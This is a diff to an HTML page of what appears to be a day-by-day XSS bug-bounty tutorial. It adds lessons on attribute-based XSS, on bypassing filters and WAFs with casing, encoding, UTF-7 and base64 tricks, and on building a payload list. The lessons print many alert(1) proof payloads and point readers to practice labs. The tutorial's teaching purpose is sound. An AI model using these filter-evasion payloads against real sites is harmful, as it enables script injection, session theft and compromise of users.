@@ -1107,31 +1107,424 @@ body { background-image: url("javascript​:alert('CSS XSS')"); }</code></pre>
         <p>Even if modern browsers patch this, CSP misconfigurations + CSS injection can still allow data exfiltration, keylogging (with clever background image tracking), or advanced phishing UI tricks.</p>
         <p>So do not ignore CSS injection in bug bounty reports sometimes it’s the key to a full exploit chain.</p>
         
-        <h4>that's it for day 11</h4>
+        <h4>That's it for day 11</h4>
       </div>
       <!-- Day 11 End -->
       <!-- Day 12 Start -->  
       <div class="suggested-topics">
         <a class="topic" href="#day12">
-          <span style="font-size: larger;">Day 12: Bypassing HTML Filters with Template Injection</span>
+          <span style="font-size: larger;">Day 12: Attribute-Based XSS</span>
           <span class="plus">+</span>
         </a>
       </div>
       <div class="day12-content" style="display: none;">
-        Coming soon...
+        <h3>Not all XSS comes from &lt;script&gt; tags</h3>
+        <p>
+          Sometimes, the vulnerability hides inside HTML attributes — the parts of a tag that define its behavior.
+        </p>
+        <p>
+          If you can sneak code into these attributes, you can trigger JavaScript execution in clever ways that bypass common filters.
+        </p>
+        
+        <h3>How It Works</h3>
+        <p>
+          Attribute-Based XSS happens when your input is reflected inside an HTML attribute (like <code>src</code>, <code>href</code>, <code>title</code>, <code>value</code>, <code>alt</code>) without proper escaping.
+        </p>
+        <p>
+          If you can break out of the attribute value and add your own event handler or JavaScript, you can trigger code execution even if &lt;script&gt; tags are blocked.
+        </p>
+        
+        <h3>Example Payloads</h3>
+        
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;img src=x onerror=alert(1)&gt;</code></pre>
+        </div>
+        
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;a href=&quot;javascript:alert(1)&quot;&gt;Click me&lt;/a&gt;</code></pre>
+        </div>
+        
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;input value=&quot;X&quot; autofocus onfocus=alert(1)&gt;</code></pre>
+        </div>
+        
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;details open ontoggle=alert(1)&gt;</code></pre>
+        </div>
+        
+        <h3>Why This Works</h3>
+        <p>
+          When the browser sees an HTML attribute, it treats everything after <code>=</code> as a value.
+        </p>
+        <p>
+          If you can close the quotes or inject an event handler, you gain control.  
+          This bypasses filters that only look for &lt;script&gt; tags in the HTML body.
+        </p>
+        
+        <h3>Your Challenge Today</h3>
+        <p>Find any place where your input is inside an HTML attribute.</p>
+        <ul>
+          <li>Try breaking out of the value with a quote (<code>"</code>) or no quote at all.</li>
+          <li>Add an event handler like <code>onerror</code>, <code>onclick</code>, <code>onfocus</code>.</li>
+          <li>Test with harmless payloads first (<code>alert(1)</code>) before trying anything advanced.</li>
+        </ul>
+        
+        <h3>Tip</h3>
+        <p>
+          If <code>onerror</code> or <code>onclick</code> is filtered, try rarer handlers like <code>ontoggle</code>, <code>onanimationstart</code>, <code>onpointerover</code>.
+        </p>
+        <p>
+          Attributes in SVG tags often allow unexpected handlers that work in modern browsers.
+        </p>
+        <h4>That's it for Day 12</h4>
       </div>
       <!-- Day 12 End -->
+              
       <!-- Day 13 Start -->  
       <div class="suggested-topics">
-        <a class="topic" href="#day12">
-          <span style="font-size: larger;">Day 13: --</span>
+        <a class="topic" href="#day13">
+          <span style="font-size: larger;">Day 13: Filtering & Bypass Tactics</span>
           <span class="plus">+</span>
         </a>
       </div>
-      <div class="day12-content" style="display: none;">
-        Coming soon...
+      <div class="day13-content" style="display: none;">
+        <h3>When Hunting XSS, Expect Defenses</h3>
+          <p>
+          In most real-world targets, simple payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> won’t work right away.  
+          Websites usually have filters, sanitizers, or Web Application Firewalls (WAFs) in place to block common XSS attempts.
+          </p>
+          <p>
+          Your job isn’t just to find injection points — it’s to <strong>creatively bypass</strong> whatever defenses exist.  
+          This is where XSS transforms from a basic exploit into a true puzzle.
+          </p>
+          
+          <h3>How It Works</h3>
+          <p>
+          Web applications try to block XSS using one or more of these techniques:
+          </p>
+          <ul>
+          <li><strong>Blacklists</strong> — removing certain words or tags (e.g., <code>&lt;script&gt;</code>).</li>
+          <li><strong>Whitelists</strong> — allowing only approved tags/attributes.</li>
+          <li><strong>Encoding</strong> — turning characters like <code>&lt;</code> into <code>&amp;lt;</code>.</li>
+          <li><strong>Sanitization libraries</strong> — e.g., DOMPurify, OWASP Java HTML Sanitizer.</li>
+          </ul>
+          
+          <p>Your bypass method depends on the filter type:</p>
+          <ul>
+          <li><strong>Break the filter logic</strong> — use alternate encodings, mixed casing, or unexpected syntax.</li>
+          <li><strong>Abuse lesser-known HTML features</strong> — e.g., SVG, MathML, obscure event attributes, CSS-based triggers.</li>
+          <li><strong>Chain vulnerabilities</strong> — combine multiple small flaws to get full code execution.</li>
+          </ul>
+          
+          <h3>Example Payloads</h3>
+          
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;ImG sRc=x OnErRoR=alert(1)&gt;  &lt;!-- mixed casing bypass --&gt;</code></pre>
+          </div>
+          
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;svg onload=alert(1)&gt;  &lt;!-- using different tag --&gt;</code></pre>
+          </div>
+          
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">%3Cscript%3Ealert(1)%3C/script%3E  &lt;!-- URL-encoded --&gt;</code></pre>
+          </div>
+          
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;  &lt;!-- nested tag confusion --&gt;</code></pre>
+          </div>
+          
+          <h3>Why This Works</h3>
+          <p>
+          Filters often make assumptions. They might target only:
+          </p>
+          <ul>
+          <li>Exact matches (e.g., <code>&lt;script&gt;</code> in lowercase).</li>
+          <li>Basic keywords (like <code>alert</code>).</li>
+          <li>Obvious HTML tags without considering obscure ones.</li>
+          </ul>
+          <p>
+          By slightly altering how JavaScript is delivered — without changing its function — you can slip past these defenses.
+          </p>
+          <h3>Common Encodings for XSS Filter Bypass</h3>
+          <p>
+            Many filters rely on exact pattern matching — so changing the way characters are represented can slip past them.
+            These techniques alter the payload’s <em>appearance</em> without changing its <em>execution</em>.
+          </p>
+          
+          <h4>1. HTML Entity Encoding</h4>
+          <ul>
+            <li>Decimal entities: <code>&amp;#60;</code> for <code>&lt;</code></li>
+            <li>Hexadecimal entities: <code>&amp;#x3C;</code> for <code>&lt;</code></li>
+          </ul>
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                  <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+                </svg>
+              </button>
+            </div>
+            <pre><code class="code-txt">&amp;#x3C;img src=x onerror=alert(1)&amp;#x3E;</code></pre>
+          </div>
+          
+          <h4>2. URL Encoding (Percent Encoding)</h4>
+          <p>
+            Encodes characters as <code>%xx</code> where <code>xx</code> is the hex value.
+          </p>
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                  <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+                </svg>
+              </button>
+            </div>
+            <pre><code class="code-txt">%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E</code></pre>
+          </div>
+          
+          <h4>3. Mixed Encoding</h4>
+          <p>
+            Combine HTML entities and URL encoding to confuse the filter.
+          </p>
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                  <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+                </svg>
+              </button>
+            </div>
+            <pre><code class="code-txt">%26%2360%3Bimg%20src%3Dx%20onerror%3Dalert%281%29%26%2362%3B</code></pre>
+          </div>
+          
+          <h4>4. UTF-7 Encoding (Obsolete but works in legacy systems)</h4>
+          <p>
+            Some old browsers or misconfigured servers may interpret UTF-7.
+          </p>
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                  <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+                </svg>
+              </button>
+            </div>
+            <pre><code class="code-txt">+ADw-img src=x onerror=alert(1)+AD4-</code></pre>
+          </div>
+          
+          <h4>5. Base64 Injection</h4>
+          <p>
+            Encode script in Base64 and embed via <code>data:</code> URLs.
+          </p>
+          <div class="code-block-wrapper" style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                  <path d="M4 16c-1.1 0-2-.9-2-2V4c1.1 0 2 .9 2 2"></path>
+                </svg>
+              </button>
+            </div>
+            <pre><code class="code-txt">&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/iframe&gt;</code></pre>
+          </div>
+          
+          <p><strong>Note:</strong> Always test encodings in a safe environment like 
+          <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">PortSwigger XSS Labs</a> or 
+          <a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">Google XSS Game</a>.
+          </p>
+
+          <h3>Our Challenge Today</h3>
+          <p>
+          Practice against a simple HTML filter in a lab environment and see how it reacts to:
+          </p>
+          <ul>
+          <li>Different capitalizations.</li>
+          <li>Encoded characters (URL encoding, HTML entities).</li>
+          <li>Uncommon tags (SVG, MathML).</li>
+          <li>HTML injection chaining.</li>
+          </ul>
+          <p><strong>Document every bypass that works</strong> — this will help you understand filter behavior deeply.</p>
+          
+          <h3>Labs to Practice</h3>
+          <ul>
+          <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">PortSwigger XSS Labs</a> — Covers reflected, stored, DOM, and filter bypass techniques.</li>
+          <li><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">Google XSS Game</a> — Interactive puzzles focusing on bypasses.</li>
+          <li><a href="https://juice-shop.herokuapp.com/" target="_blank" rel="noopener">OWASP Juice Shop</a> — Realistic vulnerable app with many XSS scenarios.</li>
+          <li><a href="https://tryhackme.com/room/xss" target="_blank" rel="noopener">TryHackMe — XSS Room</a> — Guided practice for beginners and intermediates.</li>
+          </ul>
+          
+          <h3>Tip</h3>
+          <p>
+          When you get stuck, don’t just try random payloads — study the filter.  
+          Send controlled input and observe how it changes.  
+          If you can deduce the regex, sanitizer rules, or encoding pattern, you can design a payload that <em>perfectly sidesteps</em> it.
+          </p>
       </div>
       <!-- Day 13 End -->
+              
+      <!-- Day 14 Start -->  
+      <div class="suggested-topics">
+        <a class="topic" href="#day14">
+          <span style="font-size: larger;">Day 14: Practice + Create Our Payload List</span>
+          <span class="plus">+</span>
+        </a>
+      </div>
+      <div class="day14-content" style="display: none;">
+      <p>By now, we’ve explored multiple <strong>XSS injection points</strong>, bypass methods, and filter evasion tricks. Today’s focus is not on learning new concepts, but on <strong>strengthening our skills</strong> by building a <em>personal payload arsenal</em>. This will save our valuable time during real-world testing and make you far more effective in finding vulnerabilities.</p>
+      <h3>Why This Matters:</h3>
+      <ul>
+          <li>Hunting without a payload list is like going to war without weapons.</li>
+          <li>Your list will evolve as you learn and discover more bypasses.</li>
+          <li>Having ready-to-use payloads increases speed and efficiency during bug bounty hunting.</li>
+      </ul>
+      
+      <h3>How to Build Your Payload List:</h3>
+      <ol>
+          <li>
+              <strong>Categorise by Context</strong>
+              <ul>
+                  <li>Event handler payloads: <code>onerror=</code>, <code>onload=</code>, <code>onclick=</code></li>
+                  <li>Script tag payloads: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                  <li>Encoded payloads: <code>%3Cscript%3Ealert(1)%3C/script%3E</code></li>
+                  <li>Template injection payloads: <code>{{7*7}}</code></li>
+              </ul>
+          </li>
+          <li>
+              <strong>Test in Different Scenarios</strong>
+              <ul>
+                  <li>Inside HTML attributes</li>
+                  <li>Within inline CSS styles</li>
+                  <li>In JavaScript variables</li>
+                  <li>As URL query parameters</li>
+              </ul>
+          </li>
+          <li>
+              <strong>Keep Both Clean &amp; Obfuscated Versions</strong>
+              <ul>
+                  <li>Clean: Easy to understand – <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+                  <li>Obfuscated: Harder for filters to detect – Use <strong>Hex</strong>, <strong>Base64</strong>, <strong>HTML entity encoding</strong>, or <strong>mixed encoding</strong>.</li>
+              </ul>
+          </li>
+          <li>
+              <strong>Store in a Central Place</strong>
+              <ul>
+                  <li>Local file (e.g., <code>payloads.txt</code>)</li>
+                  <li>Private GitHub Gist</li>
+                  <li>Notes app with clear category tags</li>
+              </ul>
+          </li>
+      </ol>
+      
+      <h3>Common Encodings for XSS Filter Bypassing:</h3>
+      <ul>
+          <li>HTML Entities: <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></li>
+          <li>Hex Encoding: <code>&lt;img src=&#x78; onerror=alert(1)&gt;</code></li>
+          <li>Unicode Encoding: <code>&lt;img src=\u0078 onerror=alert(1)&gt;</code></li>
+          <li>Base64 Encoding: Use <code>data:text/html;base64,</code> + encoded payload</li>
+          <li>URL Encoding: <code>%3Cscript%3Ealert(1)%3C/script%3E</code></li>
+          <li>Mixed Encoding: Combine multiple encoding types to evade WAFs</li>
+      </ul>
+      
+      <h3>Labs to Practice:</h3>
+      <ul>
+          <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger Web Security Academy – XSS Labs</a></li>
+          <li><a href="https://xss-game.appspot.com/" target="_blank">Google XSS Game</a></li>
+          <li><a href="https://pentesterlab.com/exercises/xss_and_mysql_file/course" target="_blank">PentesterLab – XSS Challenges</a></li>
+          <li><a href="https://tryhackme.com/room/xssgi" target="_blank">TryHackMe – XSS Game</a></li>
+          <li><a href="http://testphp.vulnweb.com" target="_blank">Acunetix Test Site</a></li>
+      </ul>
+      
+      <h3>Tip:</h3>
+      <p>Whenever you discover a new filter bypass technique, add it immediately to your list along with:</p>
+      <ul>
+          <li>The <strong>source</strong> (where you learned it)</li>
+          <li>The <strong>context</strong> (attribute, script, URL, etc.)</li>
+          <li>The <strong>environment</strong> it worked in</li>
+      </ul>
+      <p>This habit will make your arsenal extremely powerful over time.</p>
+      <h4>That's it for Day 14</h4>
+      </div>
+      <!-- Day 14 End -->
+      <!-- Day 15 Start -->  
+      <div class="suggested-topics">
+        <a class="topic" href="#day15">
+          <span style="font-size: larger;">Day 15: --</span>
+          <span class="plus">+</span>
+        </a>
+      </div>
+      <div class="day15-content" style="display: none;">
+        Coming soon...
+      </div>
+      <!-- Day 15 End -->
        <!-- Steps to Take to Hunt for XSS Start -->  
       <div class="suggested-topics">
         <a class="topic" href="#steps-2-find-xss">
@@ -1623,6 +2016,7 @@ body { background-image: url("javascript​:alert('CSS XSS')"); }</code></pre>
       <script src="../../scripts/main.js"></script>
       <script src="../../scripts/msg-popup.js"></script>
 </html>
+
 
 
 
